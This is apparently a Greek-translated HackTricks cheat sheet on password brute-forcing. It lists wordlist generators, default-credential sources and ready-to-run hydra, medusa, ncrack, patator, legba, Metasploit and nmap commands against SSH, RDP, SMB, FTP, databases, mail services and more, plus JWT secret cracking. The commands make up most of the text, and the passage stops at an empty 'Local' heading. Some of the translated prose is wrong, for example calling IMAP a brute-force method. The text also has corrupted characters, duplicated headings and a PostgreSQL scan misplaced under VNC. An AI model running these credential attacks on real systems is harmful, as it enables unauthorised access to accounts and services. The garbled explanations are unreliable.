# Brute Force - CheatSheet

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Κόκκινης Ομάδας AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφημα**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Προεπιλεγμένα Διαπιστευτήρια

**Αναζητήστε στο Google** για τα προεπιλεγμένα διαπιστευτήρια της τεχνολογίας που χρησιμοποιείται, ή **δοκιμάστε αυτούς τους συνδέσμους**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Δημιουργία των Δικών σας Λεξικών**

Βρείτε όσο περισσότερες πληροφορίες μπορείτε για τον στόχο και δημιουργήστε ένα προσαρμοσμένο λεξικό. Εργαλεία που μπορεί να βοηθήσουν:

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### Cewl

Η εργαλειοθήκη **Cewl** χρησιμοποιείται για τη δημιουργία λεξικών από κείμενο που έχει εξαχθεί από ιστοσελίδες. Μπορεί να χρησιμοποιηθεί για επίθεση με brute force σε κωδικούς πρόσβασης.

```bash
cewl example.com -m 5 -w words.txt
```

### [CUPP](https://github.com/Mebus/cupp)

Δημιουργήστε κωδικούς πρόσβασης βασισμένους στη γνώση σας για το θύμα (ονόματα, ημερομηνίες...)

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

Ένα εργαλείο για τη δημιουργία λίστας λέξεων, που σας επιτρέπει να παρέχετε ένα σύνολο λέξεων, δίνοντάς σας τη δυνατότητα να δημιουργήσετε πολλαπλές παραλλαγές από τις δοθείσες λέξεις, δημιουργώντας μια μοναδική και ιδανική λίστα λέξεων για χρήση σχετικά με ένα συγκεκριμένο στόχο.

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### Λίστες Λέξεων

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο **προηγμένα εργαλεία** της παγκόσμιας κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Υπηρεσίες

Ταξινομημένες κατά αλφαβητική σειρά όνοματος υπηρεσίας.

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

#### Brute Force

Η επίθεση Brute Force είναι μια τεχνική που στοχεύει στο να δοκιμάσει όλους τους πιθανούς συνδυασμούς για να βρει τα σωστά διαπιστευτήρια εισόδου. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για να αποκτήσει πρόσβαση σε συστήματα, λογαριασμούς ή δεδομένα. Είναι σημαντικό να προστατεύετε τα συστήματά σας από αυτού του είδους επιθέσεις με ισχυρούς κωδικούς πρόσβασης και πολιτικές περιορισμο

```bash
nmap --script ajp-brute -p 8009 <IP>
```

## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

Η Cassandra είναι ένα σύστημα διαχείρισης βάσεων δεδομένων που χρησιμοποιείται για τη διαχείριση μεγάλων όγκων δεδομένων με υψηλή διαθεσιμότητα.

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### CouchDB

Η επίθεση με βίαιη δύναμη είναι μια από τις πιο δημοφιλείς τεχνικές επίθεσης εναντίον του CouchDB. Οι επιτιθέμενοι χρησιμοποιούν λίστες με συνηθισμένα κωδικούς πρόσβασης ή δημιουργούν προσαρμοσμένες λίστες κωδικών για να δοκιμάσουν όλους τους πιθανούς συνδυασμούς μέχρι να βρουν τον σωστό κωδικό πρόσβασης.

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Καταχώριση Docker

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

#### Βρute-Force Επίθεση

Μια brute-force επίθεση στο Elasticsearch μπορεί να πραγματοποιηθεί χρησιμοποιώντας εργαλεία όπως το Hydra ή το Patator. Μπορείτε να δοκιμάσετε διαφορετικούς συνδυασμούς ονομάτων χρηστών και κωδικών πρόσβασης μέχρι να βρείτε το σωστό. Είναι σημαντικό να θυμάστε ότι η εκτέλεση brute-force επιθέσεων εναντίον συστημάτων χωρίς την άδεια του ιδιοκτήτη είναι παράνομη και απαγορεύεται.

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

Η επίθεση με βίαιη δύναμη (brute force) στο FTP συνήθως γίνεται με το λογισμικό Hydra. Το Hydra είναι ένα εργαλείο που χρησιμοποιεί λεξικά για να δοκιμάσει πολλούς συνδυασμούς ονομάτων χρηστών και κωδικών πρόσβασης. Μπορείτε να το χρησιμοποιήσετε με την εντολή hydra -l -P ftp://\<target\_ip>.

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### HTTP Γενική Εξαναγκαστική

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Βασική Ταυτοποίηση

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - Αποστολή Φόρμας Post

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

Για το http**s** πρέπει να αλλάξετε από "http-post-form" σε "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla ή (D)rupal ή (M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

Η IMAP (Internet Message Access Protocol) είναι μια διαδεδομένη μέθοδος επίθεσης brute force σε email λογαριασμούς.

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

Το Internet Relay Chat (IRC) είναι ένα πρωτόκολλο επικοινωνίας σε πραγματικό χρόνο που χρησιμοποιείται για συνομιλίες σε ομάδες.

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

Η ISCSI (Internet Small Computer System Interface) είναι μια τεχνολογία που επιτρέπει τη μεταφορά SCSI εντολών πάνω από δίκτυα TCP/IP.

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

Το JSON Web Token (JWT) είναι ένα ασφαλές τρόπος μεταφοράς πληροφοριών μεταξύ δύο συστημάτων.

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

Η επίθεση Brute Force εναντίον του MSSQL γίνεται συνήθως με τη χρήση εργαλείων όπως το Hydra, το Metasploit ή το Nmap. Μπορείτε επίσης να χρησιμοποιήσετε λεξικούς επιθέσεων όπως το RockYou για να δοκιμάσετε συνηθισμένες κωδικές πρόσβασης.

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

Η επίθεση Brute Force είναι μια από τις πιο δημοφιλείς τεχνικές επίθεσης εναντίον συστημάτων MySQL. Ο εισβολέας χρησιμοποιεί λίστες με συνηθισμένα ονόματα χρηστών και κωδικούς πρόσβασης για να δοκιμάσει να εισέλθει στο σύστημα. Η προστασία ενάντια σε αυτή την επίθεση περιλαμβάνει τη χρήση ισχυρών, μη προβλέψιμων κωδικών πρόσβασης και την περιορισμένη πρόσβαση στον MySQL server.

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

Brute-force attacks against Oracle databases can be performed using tools like Hydra or custom scripts. These attacks involve trying multiple username and password combinations until the correct one is found. It is important to note that brute-force attacks can be time-consuming and may trigger account lockout mechanisms if too many failed attempts are made.

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

Για να χρησιμοποιήσετε το **oracle\_login** με το **patator** χρειάζεστε να **εγκαταστήσετε**:

```bash
pip3 install cx_Oracle --upgrade
```

[Εξωτερική επίθεση χωρίς ίχνη με brute force σε hash OracleSQL εκτός σύνδεσης](https://github.com/carlospolop/hacktricks/blob/gr/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**εκδόσεις 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** και **11.2.0.3**):

```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

Η επίθεση Brute Force είναι μια από τις πιο δημοφιλείς τεχνικές επίθεσης στον κόσμο της κυβερνοασφάλειας. Στην επίθεση Brute Force, ο εισβολέας προσπαθεί να ανακαλύψει τον κωδικό πρόσβασης ενός λογαριασμού δοκιμάζοντας συνεχώς διαφορετικούς συνδυασμούς κωδικών, μέχρι να βρει τον σωστό. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για να αποκτήσει πρόσβαση σε διάφορες υπηρεσίες, όπως email λογαριασμούς, κοινωνικά δίκτυα, και άλλες online πλατφόρμες.

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

Η επίθεση με βίαιη δύναμη είναι μια από τις πιο βασικές τεχνικές επίθεσης στην PostgreSQL. Αυτή η τεχνική περιλαμβάνει τη δοκιμή όλων των πιθανών συνδυασμών για κωδικούς πρόσβασης ή άλλες μορφές αυθεντικοποίησης. Οι επιτιθέμενοι χρησιμοποιούν λίστες κωδικών, λεξικά ή ακόμα και γεννήτριες κωδικών για να δοκιμάσουν όλες τις πιθανές τιμές. Αυτή η τεχνική μπορεί να είναι αποτελεσματική αν ο κωδικός πρόσβασης είναι αδύνατος ή αν δεν υπάρχουν περιορισμοί στις προσπάθειες εισόδου.

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

Μπορείτε να κατεβάσετε το πακέτο `.deb` για εγκατάσταση από [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

Redis (Remote Dictionary Server) είναι ένα open-source in-memory key-value αποθηκευτικό σύστημα δεδομένων.

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

Η επίθεση Rexec είναι μια μορφή επίθεσης brute-force που στοχεύει στον έλεγχο ταυτότητας του χρήστη σε ένα σύστημα.

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

### Επίθεση Brute Force

Η επίθεση Brute Force είναι μια τεχνική που στοχεύει στην αναγωγή του κωδικού πρόσβασης ενός συστήματος με τη δοκιμή εναλλακτικϽν κωδικϽν μέχρι να βρεθεί ο σωστός. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί στο πρωτόκολλο Rlogin για να αποκτηθεί πρόσβαση σε ένα σύστημα.

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

Η επίθεση Brute Force είναι μια από τις πιο απλές μεθόδους επίθεσης. Στην ουσία, ο εισβολέας δοκιμάζει όλους τους πιθανούς συνδυασμούς χρησιμοποιώντας λίστα κωδικών πρόσβασης μέχρι να βρει τον σωστό. Αυτή η μέθοδος μπορεί να είναι αποτελεσματική, αλλά μπορεί να απαιτήσει πολύ χρόνο, ειδικά αν ο κωδικός πρόσβασης είναι πολύπλοκος.

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

#### Επίθεση Brute Force

Η επίθεση Brute Force είναι μια τεχνική επίθεσης που στοχεύει στην αναγνώριση κωδικών πρόσβασης με τη δοκιμή όλων των πιθανών συνδυασμών μέχρι να βρεθεί ο σωστός κωδικός. Αυτή η μέθοδος είναι αποτελεσματική όταν οι κωδικοί πρόσβασης είναι αδύνατο να προβλεφθούν ή να ανακτηθούν με άλλο τρόπο.

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

Το SOCKS είναι ένα πρωτόκολλο που επιτρέπει στους χρήστες να δρομολογούν την κυκλοφορία του δικτύου μέσω ενός διακομιστή προκειμένου να ανωνυμοποιηθούν και να παρακάμψουν φίλτρα πρόσβασης.

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

Η επίθεση με βίαιη δύναμη είναι μια από τις πιο δημοφιλείς τεχνικές εισβολής στο SQL Server. Σε αυτήν την τεχνική, ο εισβολέας δοκιμάζει συνεχώς διαφορετικές συνδυασμούς ονομάτων χρηστών και κωδικών πρόσβασης μέχρι να βρει το σωστό συνδυασμό που του επιτρέπει να εισέλθει στο σύστημα. Αυτή η τεχνική μπορεί να είναι χρονοβόρα, αλλά σε ορισμένες περιπτώσεις μπορεί να οδηγήσει σε επιτυχή εισβολή.

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

SSH (Secure Shell) είναι ένα πρωτόκολλο δικτύου που χρησιμοποιείται για ασφαλή ανταλλαγή δεδομένων μεταξύ δύο συστημάτων.

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### Αδύναμα κλειδιά SSH / Προβλέψιμο PRNG του Debian

Ορισμένα συστήματα έχουν γνωστές ελαττώσεις στον τυχαίο σπόρο που χρησιμοποιείται για τη δημιουργία κρυπτογραφικού υλικού. Αυτό μπορεί να οδηγήσει σε μειωμένο χώρο κλειδιών που μπορεί να αποδοθεί με εργαλεία όπως το [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Επίσης, υπάρχουν προ-δημιουργημένα σύνολα αδύναμων κλειδιών όπως το [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ και OpenMQ)

Το πρωτόκολλο κειμένου STOMP είναι ένα ευρέως χρησιμοποιούμενο πρωτόκολλο μηνυμάτων που **επιτρέπει απρόσκοπτη επικοινωνία και αλληλεπίδραση με δημοφιλείς υπηρεσίες ουράς μηνυμάτων** όπως το RabbitMQ, το ActiveMQ, το HornetQ και το OpenMQ. Παρέχει μια τυποποιημένη και αποτελεσματική προσέγγιση για την ανταλλαγή μηνυμάτων και την εκτέλεση διάφορων λειτουργιών μηνυμάτων.

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

Telnet είναι ένα πρωτόκολλο δικτύου που επιτρέπει σε έναν χρήστη να συνδεθεί σε έναν απομακρυσμένο υπολογιστή ή συσκευή και να αλληλεπιδράσει μαζί του μέσω κοινών εντολών κειμένου.

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Τοπικά

